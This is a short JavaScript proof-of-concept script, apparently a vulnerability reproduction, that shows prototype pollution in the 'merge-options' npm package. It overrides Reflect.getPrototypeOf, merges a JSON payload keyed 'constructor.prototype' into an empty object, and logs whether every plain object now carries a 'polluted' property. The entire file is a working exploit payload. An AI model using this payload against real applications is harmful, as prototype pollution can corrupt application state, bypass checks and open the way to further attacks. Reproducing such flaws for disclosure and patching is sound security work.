Reflect.getPrototypeOf = () => false;
const merge = require('merge-options');
const malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);